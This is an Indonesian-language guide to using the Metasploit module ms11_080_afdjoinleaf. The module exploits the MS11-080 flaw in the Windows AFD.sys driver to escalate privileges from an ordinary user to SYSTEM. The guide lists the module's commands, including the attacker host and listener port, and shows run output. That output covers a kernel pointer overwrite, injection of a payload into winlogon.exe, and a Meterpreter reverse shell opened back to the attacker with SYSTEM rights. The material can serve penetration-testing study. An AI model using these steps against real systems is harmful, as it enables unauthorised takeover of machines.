# ms11_080_afdjoinleaf

Modul `ms11_080_afdjoinleaf` di Metasploit adalah modul `exploit local` untuk sistem Windows yang memanfaatkan kerentanan pada driver `AFD.sys` (`Ancillary Function Driver`) yang diungkap dalam buletin keamanan `MS11-080`. Eksploitasi ini memungkinkan eskalasi hak akses dari user biasa ke `SYSTEM` dengan menyalahgunakan pengelolaan objek kernel melalui fungsi `NtMapUserPhysicalPages`.

## Cara Penggunaan di Metasploit

```
use exploit/windows/local/ms11_080_afdjoinleaf
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] Kernel Base Address: 0x804d7000
[*] HalDispatchTable Address: 0x80553038
[*] HaliQuerySystemInformation Address: 0x80715bba
[*] HalpSetSystemInformation Address: 0x80718436
[*] Triggering AFDJoinLeaf pointer overwrite...
[*] Injecting the payload into SYSTEM process: winlogon.exe
[*] Creating the thread to execute in 0xaf0000 (pid=620)
[*] Sending stage (177734 bytes) to 192.168.1.54
[*] Restoring the original token...
[*] Meterpreter session 26 opened (192.168.1.11:4444 -> 192.168.1.54:1059) at 2025-05-17 08:17:32 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
